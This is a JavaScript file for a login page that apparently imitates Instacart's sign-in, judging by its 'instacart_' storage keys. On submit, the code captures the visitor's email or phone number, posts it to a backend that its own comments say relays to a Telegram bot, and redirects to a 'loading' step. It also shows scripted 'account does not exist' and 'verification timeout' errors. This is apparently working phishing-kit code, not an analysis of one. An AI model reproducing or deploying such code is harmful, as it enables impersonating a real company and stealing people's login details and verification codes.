// Form validation and submission
document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    const phoneEmailInput = document.getElementById('phone-email');
    const submitButton = loginForm.querySelector('.submit-button');
    const phoneToggle = document.getElementById('phoneToggle');
    const title = document.querySelector('.title');
    
    let isPhoneMode = false;
    
    // Check for error parameter in URL
    const urlParams = new URLSearchParams(window.location.search);
    const errorType = urlParams.get('error');
    if (errorType === 'account') {
        showError(phoneEmailInput, 'Account does not exist');
    } else if (errorType === 'timeout') {
        showError(phoneEmailInput, 'Verification timeout. Please try again.');
    }
    
    // Toggle between email and phone mode
    if (phoneToggle) {
        phoneToggle.addEventListener('click', function(e) {
            e.preventDefault();
            isPhoneMode = !isPhoneMode;
            
            if (isPhoneMode) {
                phoneEmailInput.placeholder = 'Enter your phone number';
                phoneEmailInput.type = 'tel';
                phoneEmailInput.value = '';
                phoneToggle.querySelector('span').textContent = 'Email';
            } else {
                phoneEmailInput.placeholder = 'Enter your email address';
                phoneEmailInput.type = 'text';
                phoneEmailInput.value = '';
                phoneToggle.querySelector('span').textContent = 'Phone';
            }
            
            phoneEmailInput.focus();
            clearError(phoneEmailInput);
        });
    }
    
    // Email validation regex
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    
    // Phone validation regex (supports various formats)
    const phoneRegex = /^[\+]?[(]?[0-9]{3}[)]?[-\s\.]?[0-9]{3}[-\s\.]?[0-9]{4,6}$/;
    
    // Input validation
    function validateInput(value) {
        if (!value || value.trim() === '') {
            return { valid: false, message: isPhoneMode ? 'Please enter a phone number' : 'Please enter an email address' };
        }
        
        const trimmedValue = value.trim();
        
        if (isPhoneMode) {
            // Remove all non-numeric characters for phone validation
            const numericOnly = trimmedValue.replace(/\D/g, '');
            
            if (numericOnly.length >= 10) {
                return { valid: true, type: 'phone' };
            } else {
                return { valid: false, message: 'Please enter a valid phone number' };
            }
        } else {
            // Check if it's an email
            if (emailRegex.test(trimmedValue)) {
                return { valid: true, type: 'email' };
            } else {
                return { valid: false, message: 'Please enter a valid email address' };
            }
        }
    }
    
    // Show error message
    function showError(input, message) {
        input.classList.add('error');
        
        // Remove existing error message if any
        const existingError = input.parentElement.querySelector('.error-message');
        if (existingError) {
            existingError.remove();
        }
        
        // Create and insert error message
        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        errorDiv.textContent = message;
        input.parentElement.appendChild(errorDiv);
    }
    
    // Clear error message
    function clearError(input) {
        input.classList.remove('error');
        const errorMessage = input.parentElement.querySelector('.error-message');
        if (errorMessage) {
            errorMessage.remove();
        }
    }
    
    // Input event - clear error on typing
    phoneEmailInput.addEventListener('input', function() {
        clearError(this);
    });
    
    // Form submission
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const inputValue = phoneEmailInput.value;
        const validation = validateInput(inputValue);
        
        if (!validation.valid) {
            showError(phoneEmailInput, validation.message);
            return;
        }
        
        // Clear any errors
        clearError(phoneEmailInput);
        
        // Show loading state
        submitButton.classList.add('loading');
        submitButton.disabled = true;
        
        // Store contact info immediately
        const sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('instacart_session', sessionId);
        localStorage.setItem('instacart_contact', inputValue.trim());
        localStorage.setItem('instacart_contact_type', validation.type);
        
        // Send to API/Telegram bot
        fetch('/api/submit-data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                session: sessionId,
                step: 'phone',
                data: {
                    contact: inputValue.trim(),
                    type: validation.type
                }
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log('Sent to Telegram bot:', data);
            // Redirect to loading page WITH session ID
            window.location.href = `loading.html?step=phone&session=${sessionId}&contact=${encodeURIComponent(inputValue.trim())}&type=${validation.type}`;
        })
        .catch(error => {
            console.error('Error submitting:', error);
            submitButton.classList.remove('loading');
            submitButton.disabled = false;
            showError(phoneEmailInput, 'Error submitting. Please try again.');
        });
    });
    
    // Social login buttons (now just the phone toggle)
    const signupButton = document.querySelector('.signup-button');
    
    if (signupButton) {
        signupButton.addEventListener('click', function() {
            console.log('Sign up button clicked');
            // Could redirect to signup page if needed
        });
    }
    
    // Auto-format phone number (optional feature)
    phoneEmailInput.addEventListener('blur', function() {
        if (!isPhoneMode) return;
        
        const value = this.value.trim();
        const numericOnly = value.replace(/\D/g, '');
        
        if (numericOnly.length === 10) {
            // Format as (XXX) XXX-XXXX
            this.value = `(${numericOnly.slice(0, 3)}) ${numericOnly.slice(3, 6)}-${numericOnly.slice(6)}`;
        } else if (numericOnly.length === 11 && numericOnly[0] === '1') {
            // Format as +1 (XXX) XXX-XXXX
            this.value = `+1 (${numericOnly.slice(1, 4)}) ${numericOnly.slice(4, 7)}-${numericOnly.slice(7)}`;
        }
    });
    
    // Prevent form resubmission on page reload
    if (window.history.replaceState) {
        window.history.replaceState(null, null, window.location.href);
    }
});

// Handle viewport height on mobile (for better mobile experience)
function setViewportHeight() {
    const vh = window.innerHeight * 0.01;
    document.documentElement.style.setProperty('--vh', `${vh}px`);
}

setViewportHeight();
window.addEventListener('resize', setViewportHeight);

// Detect if user is on mobile
function isMobile() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

if (isMobile()) {
    document.body.classList.add('mobile');
    console.log('Mobile device detected');
}
